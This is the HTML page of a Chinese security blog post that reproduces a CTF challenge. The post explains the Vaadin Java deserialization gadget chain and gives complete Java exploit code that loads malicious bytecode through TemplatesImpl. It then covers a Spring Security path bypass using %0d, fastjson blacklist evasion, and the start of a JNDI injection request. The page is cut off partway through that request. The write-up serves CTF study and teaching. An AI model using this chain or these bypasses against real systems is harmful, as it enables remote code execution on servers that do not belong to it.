@@ -1,0 +1,909 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="‍ 前言要过年了忙得起飞大年初三就飞马来潜水去了于是为了不让身边的师傅卷死我就去看了下之前没打出来的CTF题目心血来潮来复现学习下，刚好遇到新的链子，就一并写篇博客记录下，标题很洋气，从CTF中学习Vaadin gadgets ‍ Vaadin链‍ Vaadin 可以理解为是一个平台吧，有UI，了解即可，Vaadin 的反序列化调用链其实蛮简单的，就是反射调用 getter​ 方法罢了 ‍ 依赖">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全 - Learning Vaadin Gadget From CTF">
+<meta property="og:url" content="https://zjackky.github.io/post/java-safety-learning-vaadin-gadget-from-ctf-z1imvgg.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="‍ 前言要过年了忙得起飞大年初三就飞马来潜水去了于是为了不让身边的师傅卷死我就去看了下之前没打出来的CTF题目心血来潮来复现学习下，刚好遇到新的链子，就一并写篇博客记录下，标题很洋气，从CTF中学习Vaadin gadgets ‍ Vaadin链‍ Vaadin 可以理解为是一个平台吧，有UI，了解即可，Vaadin 的反序列化调用链其实蛮简单的，就是反射调用 getter​ 方法罢了 ‍ 依赖">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334764.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334063.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334266.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334777.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334942.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334109.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334265.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334418.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334575.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334741.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334914.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334065.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334238.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334393.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334573.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334767.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334935.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334084.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334270.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334427.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334831.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334979.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334141.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334306.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334525.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334680.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334863.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334081.png">
+<meta property="article:published_time" content="2024-02-08T13:24:41.000Z">
+<meta property="article:modified_time" content="2024-02-08T15:34:44.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334764.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java安全 - Learning Vaadin Gadget From CTF - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"$","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全 - Learning Vaadin Gadget From CTF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-08 21:24" pubdate>
+          2024年2月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java安全 - Learning Vaadin Gadget From CTF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要过年了忙得起飞大年初三就飞马来潜水去了于是为了不让身边的师傅卷死我就去看了下之前没打出来的CTF题目心血来潮来复现学习下，刚好遇到新的链子，就一并写篇博客记录下，标题很洋气，从CTF中学习Vaadin gadgets</p>
+<p>‍</p>
+<h1 id="Vaadin链"><a href="#Vaadin链" class="headerlink" title="Vaadin链"></a>Vaadin链</h1><p>‍</p>
+<p>Vaadin 可以理解为是一个平台吧，有UI，了解即可，Vaadin 的反序列化调用链其实蛮简单的，就是反射调用 <code>getter</code>​ 方法罢了</p>
+<p>‍</p>
+<p>依赖</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">vaadin-server :</span> <span class="hljs-number">7.7</span><span class="hljs-number">.14</span><br><span class="hljs-attr">vaadin-shared :</span> <span class="hljs-number">7.7</span><span class="hljs-number">.14</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>漏洞其实就三个类</p>
+<p>‍</p>
+<h3 id="NestedMethodProperty"><a href="#NestedMethodProperty" class="headerlink" title="NestedMethodProperty"></a>NestedMethodProperty</h3><p><code>com.vaadin.data.util.NestedMethodProperty</code>​ 类可以理解为是一个封装属性方法的类，其构造方法如下</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334764.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>接收两个参数，一个是实例化的对象，一个是属性值。然后调用初始化方法将调用 <code>initialize</code>​ 方法获取实例类中的相关信息存放在成员变量中。跟进该初始化方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334063.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现已经获取到了我们传入的属性值的getter方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334266.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>并且进行对象属性的一些赋值封装</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334777.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后这个<code>NestedMethodProperty</code>​ 类 存在 <code>getValue</code>​ 方法</p>
+<p>将我们上述封装的<code>getMethods</code>​这个方法数组类进行遍历且调用里面的属性的方法名</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334942.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>因此这个类又是可以触发 TemplatesImpl 的利用方式，所以找哪个类存在 能够触发<code>NestedMethodProperty#getvalue()</code>​去调用getter方法，于是找到下面的类</p>
+<p>‍</p>
+<h3 id="PropertysetItem"><a href="#PropertysetItem" class="headerlink" title="PropertysetItem"></a>PropertysetItem</h3><p>‍</p>
+<p>触发类是 <code>com.vaadin.data.util.PropertysetItem</code>​ ，这个类实现了几个接口，初始化后能够对自己的map属性，list属性进行操作</p>
+<p>数据存放在成员变量 map 中，想要获取相应属性时，则调用 <code>getItemProperty</code>​ 方法在 map 中获取，需要传入一个对象</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334109.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>而这个类重点则是他存在<code>toString</code>​方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334265.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>从list中获取值然后去调用<code>getValue</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334418.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>那么这个list怎么赋值呢，可以关注<code>addItemProperty</code>​方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334575.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>将我们传入的id值传入</p>
+<p>‍</p>
+<p>断点看下这个​<code>getItemPropertyIds</code>​的返回值是什么</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334741.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>其实可以发现他返回的就是我们<code>list</code>​的内容</p>
+<p>那之后取出list的内容后再从map中去找对应的值去调用我们的getvalue方法</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334914.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>那么现在目的就是</p>
+<ol>
+<li>list有一个需要调用他的getter方法的id</li>
+<li>map也需要一个调用他的getter方法的id并且取出来的值为<code>NestedMethodProperty</code>​类来调用他的getvalue方法</li>
+</ol>
+<p>那其实就已经非常好去拼接了</p>
+<p>‍</p>
+<p>最后的问题就是如何在反序列化的时候调用任意类的<code>Tostring</code>​方法了，而在我们的CC5当中就接触过这个类叫<code>BadAttributeValueExpException</code>​，他的反序列化是可以调用任意类的<code>ToString</code>​方法的，于是参考SU18师傅的EXP成功弹出计算机</p>
+<p>‍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Vaadin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.NestedMethodProperty;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.PropertysetItem;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vaadin_Ser</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">PropertysetItem</span> <span class="hljs-variable">pItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertysetItem</span>();<br><br>        NestedMethodProperty&lt;Object&gt; nmprop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedMethodProperty</span>&lt;Object&gt;(templates, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        pItem.addItemProperty(<span class="hljs-string">&quot;outputProperties&quot;</span>, nmprop);<br><br>        <span class="hljs-comment">// 实例化 BadAttributeValueExpException 并反射写入</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>     <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(exception, pItem);<br><br><span class="hljs-comment">//        serialize(exception);</span><br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334065.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>整个链代码量非常少，其实还是很简单的自己动手跟下即可非常容易理解</p>
+<p>‍</p>
+<h1 id="CTFer"><a href="#CTFer" class="headerlink" title="CTFer"></a>CTFer</h1><p>这里学完这个之后来以2023年福建省赛黑盾杯的初赛babyja来进行案例分析，考点如下(其实这个题很多解法)</p>
+<ol>
+<li>Fastjson 黑名单绕过 or 不出网应用</li>
+<li>Spring Security 权限绕过</li>
+<li>Vaadin反序列化链</li>
+<li>C3P0二次反序列化</li>
+</ol>
+<p>‍</p>
+<h2 id="2023闽盾杯初赛-babyja"><a href="#2023闽盾杯初赛-babyja" class="headerlink" title="2023闽盾杯初赛 babyja"></a>2023闽盾杯初赛 babyja</h2><p>目录结构</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334238.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>查看<code>pom.xml</code>​</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334393.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>其实意图就很明显三个组件都能相互配合(马后炮)</p>
+<p>‍</p>
+<p>并且存在Spring Security的一个权限鉴权，先查看下<code>AuthConfig.class</code>​ 发现是用<code>regexMatchers</code>​来进行正则匹配路径，去查看下spring Security的版本为 5.6.3 ，而这里由于设计问题看他的控制器是随便什么都可以进入逻辑 相当于<code>admin/*</code>​ ，所以完全符合漏洞版本所以可以使用<code>%0d</code>​绕过</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334573.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>直接访问302</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334767.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>权限绕过后返回​<code>WellDone</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334935.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>当然给出账号密码也是可以登录获取Session的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334084.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>获取到Session <code>JSESSIONID=FC8D9FE4BBDAE0BC554377DB1CAFCBE8</code>​</p>
+<p>发现成功执行</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334270.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>再来查看控制器</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334427.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以发现传入data这个json字符串然后进行鉴权并且给到<code>JSON.parse</code>​解析，其实可以想到绕过黑名单+fastjson打C3p0不出网这个思路，也可以直接打jndi注入吧，跟进<code>SecurityCheck</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334831.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以想到用16进制或者unicode来进行绕过黑名单，所以有以下打法</p>
+<p>‍</p>
+<h3 id="JNDI注入-出网-jdk低版本"><a href="#JNDI注入-出网-jdk低版本" class="headerlink" title="JNDI注入(出网+jdk低版本)"></a>JNDI注入(出网+jdk低版本)</h3><p>本地用的是jdk8u65</p>
+<p>‍</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/admin/user%0d</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">localhost:8080</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate,</span> <span class="hljs-string">br</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.9</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><span class="hljs-attr">Sec-Fetch-Dest:</span> <span class="hljs-string">document</span><br><span class="hljs-attr">Sec-Fetch-Mode:</span> <span class="hljs-string">navigate</span><br><span class="hljs-attr">Sec-Fetch-Site:</span> <span class="hljs-string">none</span><br><span class="hljs-attr">Sec-Fetch-User:</span> <span class="hljs-string">?1</span><br><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span 